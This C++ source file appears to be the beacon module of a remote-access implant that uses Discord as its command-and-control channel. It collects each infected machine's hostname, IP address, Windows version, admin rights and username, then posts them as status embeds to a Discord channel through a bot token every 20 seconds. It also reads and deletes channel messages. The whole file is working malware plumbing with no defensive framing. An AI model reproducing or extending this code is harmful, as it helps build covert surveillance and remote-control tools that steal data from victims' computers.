#define NOMINMAX
#include "agents/callback.h"
#include "agents/callback_utils.h"
#include "core/InitializationStatus.h"
#include <iostream>

std::vector<int64_t> AGENT_IDS;
std::mutex agent_ids_mutex;
std::map<std::string, std::string> hostnameMessageIds;

std::string CreateJSONPayload(int agentId, const std::string& hostname, const std::string& ip,
    const std::string& lastCheckIn, int color, bool isInitializing,
    int currentPercentage,
    const std::string& statusMsg,
    const std::string& connectionTime) {
    nlohmann::json fields = {
        {{"name", "Hostname"}, {"value", "```plaintext\n" + hostname + "\n```"}, {"inline", true}},
        {{"name", "IP"}, {"value", "```plaintext\n" + ip + "\n```"}, {"inline", true}},
        {{"name", "Last Check In"}, {"value", "```plaintext\n" + lastCheckIn + "\n```"}, {"inline", true}},
        {{"name", "OS"}, {"value", "```plaintext\n" + GetWindowsVersion() + "\n```"}, {"inline", true}},
        {{"name", "Admin"}, {"value", "```plaintext\n" + std::string(IsAdmin() ? "true" : "false") + "\n```"}, {"inline", true}},
        {{"name", "Username"}, {"value", "```plaintext\n" + GetUsername() + "\n```"}, {"inline", true}}
    };

    if (isInitializing) {
        const int totalSegments = 13;
        int clampedPercentage = std::max(0, std::min(currentPercentage, 100));
        int filledSegments = static_cast<int>(std::round((static_cast<double>(clampedPercentage) / 100.0) * totalSegments));
        filledSegments = std::min(filledSegments, totalSegments);

        std::string bar;
        for (int i = 0; i < filledSegments; ++i) bar += ":white_large_square:";
        for (int i = filledSegments; i < totalSegments; ++i) bar += ":black_large_square:";

        std::string progressText = bar + " " + std::to_string(clampedPercentage) + "%";

        fields.push_back({ {"name", "Initialization"}, {"value", progressText}, {"inline", false} });
    }
    else {
        fields.push_back({ {"name", "Status"},
                           {"value", "```diff\n" + std::string(color == 0xFF0000 ? "- Offline" : "+ Online") + "\n```"},
                           {"inline", false} });
    }

    std::string title = (color == 0xFF0000) ? "Agent #~~" + std::to_string(agentId) + "~~" : "Agent #" + std::to_string(agentId);
    nlohmann::json jsonPayload = {
        {"embeds", {{
            {"title", title},
            {"color", color},
            {"fields", fields},
            {"footer", {{"text", "Connected at: " + connectionTime}}}
        }}}
    };
    return jsonPayload.dump();
}

std::vector<std::pair<std::string, std::string>> GetMessagesFromChannel(const std::string& botToken,
    const std::string& channelId) {
    std::vector<std::pair<std::string, std::string>> messages;
    HINTERNET hSession = WinHttpOpen(L"Discord Bot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return messages;

    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return messages; }

    std::wstring apiPath = L"/api/v10/channels/" + std::wstring(channelId.begin(), channelId.end()) + L"/messages";
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", apiPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return messages; }

    std::wstring headers = L"Authorization: Bot " + std::wstring(botToken.begin(), botToken.end());
    if (!WinHttpAddRequestHeaders(hRequest, headers.c_str(), static_cast<DWORD>(headers.length()), WINHTTP_ADDREQ_FLAG_ADD)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return messages;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return messages;
    }

    char buffer[4096];
    DWORD bytesRead = 0;
    std::string response;
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response.append(buffer, bytesRead);
    }

    try {
        nlohmann::json jsonResponse = nlohmann::json::parse(response);
        for (const auto& message : jsonResponse) {
            std::string messageId = message["id"];
            std::string content = message["content"];
            if (message.contains("embeds") && !message["embeds"].empty()) {
                content += "\n[Embedded Content]";
                for (const auto& embed : message["embeds"]) {
                    if (embed.contains("title")) content += "\nTitle: " + embed["title"].get<std::string>();
                    if (embed.contains("description")) content += "\nDescription: " + embed["description"].get<std::string>();
                    if (embed.contains("fields")) {
                        for (const auto& field : embed["fields"]) {
                            content += "\nField: " + field["name"].get<std::string>() + " - " + field["value"].get<std::string>();
                        }
                    }
                    if (embed.contains("footer") && embed["footer"].contains("text")) {
                        content += "\nFooter: " + embed["footer"]["text"].get<std::string>();
                    }
                }
            }
            messages.push_back({ messageId, content });
        }
    }
    catch (const std::exception& e) {
        std::cerr << "[DEBUG] Failed to parse JSON response: " << e.what() << "\n";
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return messages;
}

SendMessageResult SendDiscordMessage(const std::string& botToken, const std::string& channelId,
    const std::string& jsonPayload, std::string& messageId) {
    SendMessageResult result = { false, 0, 0 };

    HINTERNET hSession = WinHttpOpen(L"Discord Bot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return result;

    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return result; }

    std::wstring apiPath = L"/api/v10/channels/" + std::wstring(channelId.begin(), channelId.end()) + L"/messages";
    if (!messageId.empty()) apiPath += L"/" + std::wstring(messageId.begin(), messageId.end());

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, messageId.empty() ? L"POST" : L"PATCH", apiPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return result; }

    std::wstring headers = L"Content-Type: application/json\r\nAuthorization: Bot " + std::wstring(botToken.begin(), botToken.end());
    if (!WinHttpAddRequestHeaders(hRequest, headers.c_str(), static_cast<DWORD>(headers.length()), WINHTTP_ADDREQ_FLAG_ADD)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return result;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)jsonPayload.c_str(), static_cast<DWORD>(jsonPayload.length()), static_cast<DWORD>(jsonPayload.length()), 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return result;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return result;
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL);
    result.httpStatus = statusCode;

    if (statusCode == 429) {
        wchar_t retryAfterBuffer[32];
        DWORD retryAfterSize = sizeof(retryAfterBuffer);
        if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CUSTOM, L"Retry-After", retryAfterBuffer, &retryAfterSize, NULL)) {
            retryAfterBuffer[retryAfterSize / sizeof(wchar_t)] = L'\0';
            try {
                result.retryAfter = std::stoi(retryAfterBuffer);
            }
            catch (...) {
                result.retryAfter = 5;
            }
        }
        else {
            result.retryAfter = 5;
        }
    }

    if (statusCode == 200 || statusCode == 201) {
        result.success = true;
        if (messageId.empty()) {
            char buffer[4096];
            DWORD bytesRead = 0;
            if (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
                buffer[bytesRead] = '\0';
                std::string response(buffer);
                size_t idPos = response.find("\"id\":\"");
                if (idPos != std::string::npos) {
                    size_t idEnd = response.find("\"", idPos + 6);
                    messageId = response.substr(idPos + 6, idEnd - (idPos + 6));
                }
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

bool DeleteDiscordMessage(const std::string& botToken, const std::string& channelId,
    const std::string& messageId) {
    HINTERNET hSession = WinHttpOpen(L"Discord Bot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    std::wstring apiPath = L"/api/v10/channels/" + std::wstring(channelId.begin(), channelId.end()) + L"/messages/" + std::wstring(messageId.begin(), messageId.end());
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"DELETE", apiPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"Authorization: Bot " + std::wstring(botToken.begin(), botToken.end());
    if (!WinHttpAddRequestHeaders(hRequest, headers.c_str(), static_cast<DWORD>(headers.length()), WINHTTP_ADDREQ_FLAG_ADD)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
}

void AddAgentId(int64_t agentId) {
    std::lock_guard<std::mutex> lock(agent_ids_mutex);
    AGENT_IDS.push_back(agentId);
}

void UpdateTime(const std::string& botToken, const std::string& channelId, int agentId,
    const std::string& hostname, const std::string& ip) {
    std::string connectionTime = GetUniversalTime();
    std::string messageId = "";

    if (hostnameMessageIds.count(ip)) {
        messageId = hostnameMessageIds[ip];
    }


    while (true) {
        int currentPercentage = 0;
        std::string statusMsg = "Unknown";
        bool isInitializationComplete = false;

        g_InitState.Get(currentPercentage, statusMsg, isInitializationComplete);

        bool isInitializingPhase = !isInitializationComplete && currentPercentage < 100;

        int color;
        if (isInitializingPhase) {
            color = 0xFFFF00;
        }
        else {
            color = 0x00FF00;
            if (currentPercentage >= 100 && !isInitializationComplete) {
                g_InitState.Update(100, "Online", true);
                isInitializationComplete = true;
            }
            statusMsg = "Online";
        }

        std::string lastCheckIn = GetUniversalTime();
        std::string jsonPayload = CreateJSONPayload(agentId, hostname, ip, lastCheckIn, color,
            isInitializingPhase, currentPercentage, statusMsg, connectionTime);

        SendMessageResult result = SendDiscordMessage(botToken, channelId, jsonPayload, messageId);

        if (!result.success) {
            std::cerr << "[DEBUG] Failed to send beacon update for agent " << agentId << " (IP: " << ip << ") with HTTP status " << result.httpStatus << "\n";

            if (result.httpStatus == 429) {
                DWORD waitTime = result.retryAfter > 0 ? result.retryAfter : 5;
                std::cerr << "[DEBUG] Beacon rate limited, waiting " << waitTime << " seconds before retry\n";
                std::this_thread::sleep_for(std::chrono::seconds(waitTime));
                continue;
            }
            else if (result.httpStatus == 404 && !messageId.empty()) {
                std::cerr << "[DEBUG] Beacon message " << messageId << " deleted, stopping updates for IP " << ip << "\n";
                hostnameMessageIds.erase(ip);
                break;
            }
            else {
                std::cerr << "[DEBUG] Unhandled error " << result.httpStatus << " sending beacon, stopping updates for IP " << ip << "\n";
                std::this_thread::sleep_for(std::chrono::seconds(60));
                break;
            }
        }
        else {
            if (!messageId.empty() && hostnameMessageIds.count(ip) == 0) {
                hostnameMessageIds[ip] = messageId;
            }
        }

        g_InitState.Get(currentPercentage, statusMsg, isInitializationComplete);
        isInitializingPhase = !isInitializationComplete && currentPercentage < 100;

        bool isCmdRegRateLimited = (statusMsg.find("Rate Limited") != std::string::npos &&
            statusMsg.find("Cmd Reg") != std::string::npos);

        if (isCmdRegRateLimited) {
            std::cerr << "[DEBUG] Command registration seems rate limited, slowing beacon update interval to 20s.\n";
            std::this_thread::sleep_for(std::chrono::seconds(20));
        }
        else if (isInitializingPhase) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        else {
            std::this_thread::sleep_for(std::chrono::seconds(20));
        }
    }
    std::cerr << "[INFO] Exiting UpdateTime loop for agent " << agentId << " (IP: " << ip << ")" << std::endl;
}